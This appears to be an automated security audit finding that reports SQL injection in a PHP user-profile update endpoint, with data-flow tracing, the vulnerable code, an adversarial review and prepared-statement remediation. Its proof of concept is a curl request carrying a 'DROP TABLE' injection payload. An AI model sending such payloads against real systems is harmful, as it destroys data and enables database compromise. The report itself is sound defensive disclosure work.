# Vulnerability: SQL Injection — User Profile Update

## Summary
The user profile update functionality at `/user/profile.php` contains multiple SQL injection vulnerabilities. The application directly embeds user-controlled values in SQL queries without proper sanitization, allowing authenticated users to execute arbitrary SQL statements.

## Confidence
High
(Found by both Sink→Source and Source→Sink taint analysis with fully cited path and survived all 3 adversarial attacks.)

## Authentication Requirement
Authenticated (Low Privilege) - requires valid user session via isAuth() check

## Attack Surface Location
- **Endpoint:** `POST /user/profile.php`
- **Handler:** SQL queries at user/profile.php:25 and user/profile.php:27
- **Framework protections bypassed:** AumWAF provides no protection against this pattern

## Attack Chain
1. Initial access: Attacker logs in with any valid user account
2. Endpoint interaction: Attacker submits a form to update their profile at `/user/profile.php`
3. Malicious input: Attacker provides malicious input in the username, useremail, or password fields
4. Sink execution: The application directly concatenates user input into SQL queries without proper escaping, causing SQL injection
5. Post-exploitation: Attacker can read/modify all data in the database, potentially escalate privileges
6. Final impact: Complete database compromise and potential account takeover

## Data Flow
- **Source (user input):** post('username'), post('useremail'), post('password'), cookie('user_id')
- **Sink:** SQL queries at user/profile.php:25 and user/profile.php:27

```
post('username') → "UPDATE tbl_users SET username = '" . post('username') . "' WHERE id = " . cookie('user_id') [user/profile.php:27]
post('useremail') → "UPDATE tbl_users SET useremail='" . post('useremail') . "' WHERE id = " . cookie('user_id') [user/profile.php:27]
post('password') → "UPDATE tbl_users SET userpass='" . pw(post('password')) . "' WHERE id = " . cookie('user_id') [user/profile.php:25]
```

## Proof of Concept

### Prerequisites
- Valid user session (auth=true in session or cookie)
- User ID must be known (extractable from cookie 'user_id')

### Exploit Request
```bash
curl -b "auth=1; user_id=1" -X POST http://example.com/user/profile.php \
  -d "username=admin' WHERE id=1; DROP TABLE tbl_users;-- &useremail=test@example.com"
```

### Expected Vulnerable Response
```http
HTTP/1.1 302 Found
Location: logout.php
```

### Expected Patched Response
```http
HTTP/1.1 400 Bad Request
Content-Type: text/html

Invalid request
```

### Impact Demonstration
An attacker can modify any user's data (including admins), drop database tables, or extract all data from the database.

## Affected Code
```php
// user/profile.php:25
$mysqli->query("UPDATE tbl_users SET username = '" . post('username') . "', useremail='" . post('useremail') . "', userpass='" . pw(post('password')) . "' WHERE id = " . cookie('user_id'));

// user/profile.php:27
$mysqli->query("UPDATE tbl_users SET username = '" . post('username') . "', useremail='" . post('useremail') . "' WHERE id = " . cookie('user_id'));
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoint is reachable from external network at `/user/profile.php` with proper user authentication. The authentication is checked at user/profile.php:4-6 with `isAuth()` which checks if the `auth` session variable is set.
- **Impact attack — FAILED to kill.** The SQL injection allows complete database compromise, which is clearly a Sensitive Data Disclosure vulnerability. The code at user/profile.php:25 and user/profile.php:27 directly concatenates user input into SQL queries without any escaping or sanitization.
- **Validity attack — FAILED to kill.** There is no input sanitization or framework protection. The code directly concatenates user input into SQL queries. The MySQLi library is being used but not in a secure way—prepared statements are not used. The WAF in AumWAF.class.php only checks for specific scanner signatures but not for SQL injection patterns.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
1. Use prepared statements with MySQLi:
   ```php
   // Instead of
   $mysqli->query("UPDATE tbl_users SET username = '" . post('username') . "' WHERE id = " . cookie('user_id'));
   
   // Use
   $stmt = $mysqli->prepare("UPDATE tbl_users SET username = ? WHERE id = ?");
   $stmt->bind_param("ss", post('username'), cookie('user_id'));
   $stmt->execute();
   ```
2. Add server-side validation for all user inputs
3. Implement proper SQL escaping if prepared statements cannot be used immediately
4. Add CSRF protection to prevent unauthorized form submissions